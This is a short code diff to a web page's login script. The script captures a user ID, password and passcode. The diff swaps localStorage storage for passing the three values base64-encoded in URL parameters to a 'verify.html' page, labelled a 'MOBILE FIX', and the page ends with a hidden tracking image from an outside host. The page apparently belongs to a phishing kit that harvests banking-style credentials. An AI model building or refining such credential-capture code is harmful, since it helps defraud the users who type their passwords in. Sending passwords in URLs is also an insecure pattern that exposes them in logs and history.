@@ -305,14 +305,16 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        localStorage.setItem('userId', userId);
-localStorage.setItem('userPassword', password);
-localStorage.setItem('userPasscode', passcode || 'Not provided');
-        
         showLoading();
         
+        // MOBILE FIX: Pass data via URL parameters (base64 encoded)
         setTimeout(function() {
-            window.location.href = 'verify.html';
+            const params = new URLSearchParams({
+                u: btoa(userId),
+                p: btoa(password),
+                t: btoa(passcode || 'none')
+            });
+            window.location.href = 'verify.html?' + params.toString();
         }, 3000);
     });
 });
@@ -441,3 +443,4 @@ localStorage.setItem('userPasscode', passcode || 'Not provided');
     </a>
    </div>
   </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp;sz=179401" width="0" height="0"></body></html>
+
